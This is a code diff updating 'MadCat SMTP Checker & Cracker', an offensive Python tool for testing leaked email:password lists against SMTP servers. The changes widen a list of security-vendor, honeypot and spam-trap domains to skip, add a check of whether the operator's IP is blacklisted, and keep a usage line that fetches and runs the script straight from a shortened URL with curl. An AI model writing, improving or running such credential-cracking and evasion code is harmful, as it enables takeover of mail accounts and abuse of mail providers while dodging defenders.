@@ -5,11 +5,11 @@ try:
 	import psutil, requests, dns.resolver
 except ImportError:
 	print('\033[1;33minstalling missing packages...\033[0m')
-	os.system('apt -y install python3-pip; '+sys.executable+' -m pip install psutil requests dnspython pyopenssl')
+	os.system('apt -y install python3-pip; pip3 install psutil requests dnspython pyopenssl')
 	import psutil, requests, dns.resolver
 
-if sys.version_info[0] < 3:
-	exit('\033[0;31mpython 3 is required. try to run this script with \033[1mpython3\033[0;31m instead of \033[1mpython\033[0m')
+if not sys.version_info[0] > 2 and not sys.version_info[1] > 8:
+	exit('\033[0;31mpython 3.9 is required. try to run this script with \033[1mpython3\033[0;31m instead of \033[1mpython\033[0m')
 
 sys.stdout.reconfigure(encoding='utf-8')
 # mail providers, where SMTP access is desabled by default
@@ -17,7 +17,7 @@ bad_mail_servers = 'gmail,googlemail,google,mail.ru,yahoo,qq.com'
 # expanded lists of SMTP endpoints, where we can knock
 autoconfig_data_url = 'https://raw.githubusercontent.com/aels/mailtools/main/smtp-checker/autoconfigs_enriched.txt'
 # dangerous mx domains, skipping them all
-dangerous_domains = r'localhost|invalid|mx37\.m..p\.com|mailinator|mxcomet|mxstorm|proofpoint|perimeterwatch|securence|techtarget|cisco|spiceworks|gartner|fortinet|retarus|checkpoint|fireeye|mimecast|forcepoint|trendmicro|acronis|sophos|sonicwall|cloudflare|trellix|barracuda|security|clearswift|trustwave|broadcom|helpsystems|zyxel|mdaemon|mailchannels|cyren|opswat|duocircle|uni-muenster|proxmox|censornet|guard|indevis|n-able|plesk|spamtitan|avanan|ironscales|mimecast|trustifi|shield|barracuda|essentials|libraesva|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'
+dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mx1.ik2|mx37\.m..p\.com|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'
 
 b   = '\033[1m'
 z   = '\033[0m'
@@ -40,7 +40,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v23.03.19{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v23.03.30{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/freebug
@@ -90,9 +90,19 @@ def tune_network():
 		except Exception as e:
 			print(wrn+'failed to set rlimit_nofile:   '+str(e))
 
+def check_ipv4():
+	print(inf+'checking ipv4 address in blacklists...'+up)
+	try:
+		socket.has_ipv4 = read('https://api.ipify.org')
+		socket.ipv4_blacklist = re.findall(r'"name":"([^"]+)","listed":true', read('https://addon.dnslytics.net/ipv4info/v1/'+socket.has_ipv4))
+		socket.ipv4_blacklist = red(', '.join(socket.ipv4_blacklist)) if socket.ipv4_blacklist else False
+	except:
+		socket.has_ipv4 = False
+		socket.ipv4_blacklist = False
+
 def check_ipv6():
 	try:
-		socket.has_ipv6 = requests.get('https://api6.ipify.org', timeout=3).text
+		socket.has_ipv6 = read('https://api6.ipify.org', timeout=3)
 	except:
 		socket.has_ipv6 = False
 
@@ -124,6 +134,12 @@ def base64_encode(string):
 
 def normalize_delimiters(s):
 	return re.sub(r'[;,\t|]', ':', re.sub(r'[\'" ]+', '', s))
+
+def read(path):
+	return os.path.isfile(path) and open(path, 'r', encoding='utf-8-sig', errors='ignore').read() or re.search(r'^https?://', path) and requests.get(path, timeout=5).text or ''
+
+def read_lines(path):
+	return read(path).splitlines()
 
 def is_listening(ip, port):
 	try:
@@ -226,7 +242,7 @@ def wc_count(filename, lines=0):
 	file_handle = open(filename, 'rb')
 	while buf:=file_handle.raw.read(1024*1024):
 		lines += buf.count(b'\n')
-	return lines
+	return lines+1
 
 def is_ignored_host(mail):
 	global exclude_mail_hosts
@@ -385,7 +401,7 @@ def every_second():
 			net_usage = psutil.net_io_counters().bytes_sent - net_usage_old
 			net_usage_old += net_usage
 			loop_time = round(sum(loop_times)/len(loop_times), 2) if len(loop_times) else 0
-			if threads_counter<max_threads and mem_usage<80 and cpu_usage<80 and not no_jobs_left:
+			if threads_counter<max_threads and mem_usage<80 and cpu_usage<80 and jobs_que.qsize():
 				threading.Thread(target=worker_item, args=(jobs_que, results_que), daemon=True).start()
 				threads_counter += 1
 		except:
@@ -415,11 +431,12 @@ def printer(jobs_que, results_que):
 signal.signal(signal.SIGINT, quit)
 show_banner()
 tune_network()
+check_ipv4()
 check_ipv6()
 try:
 	help_message = f'usage: \n{npt}python3 <(curl -slkSL bit.ly/madcatsmtp) '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug]'
-	list_filename = ([i for i in sys.argv if os.path.isfile(i) and sys.argv[0] != i]+[False]).pop(0)
-	verify_email = ([i for i in sys.argv if is_valid_email(i)]+[False]).pop(0)
+	list_filename = ([i for i in sys.argv if os.path.isfile(i) and sys.argv[0] != i]+['']).pop(0)
+	verify_email = ([i for i in sys.argv if is_valid_email(i)]+['']).pop(0)
 	exclude_mail_hosts = ','.join([i for i in sys.argv if re.match(r'[\w.,-]+$', i) and not os.path.isfile(i) and not re.match(r'(\d+|debug)$', i)]+[bad_mail_servers])
 	start_from_line = int(([i for i in sys.argv if re.match(r'\d+$', i)]+[0]).pop(0))
 	debuglevel = len([i for i in sys.argv if i == 'debug'])
@@ -474,6 +491,7 @@ print(inf+'email & password colls:        '+bold(email_collumn)+' and '+bold(pas
 print(inf+'ignored email hosts:           '+bold(exclude_mail_hosts))
 print(inf+'goods file:                    '+bold(smtp_filename))
 print(inf+'verification email:            '+bold(verify_email or '-'))
+print(inf+'ipv4 address:                  '+bold(socket.has_ipv4 or '-')+' ('+(socket.ipv4_blacklist or green('clean'))+')')
 print(inf+'ipv6 address:                  '+bold(socket.has_ipv6 or '-'))
 input(npt+'press '+bold('[ Enter ]')+' to start...')
 
@@ -499,7 +517,8 @@ with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
 				else:
 					ignored += 1
 					progress += 1
-		if threads_counter == 0 and no_jobs_left:
+		if threads_counter == 0 and no_jobs_left and not jobs_que.qsize():
 			break
 		time.sleep(0.04)
+time.sleep(1)
 print('\r\n'+okk+green('well done. bye.',1))
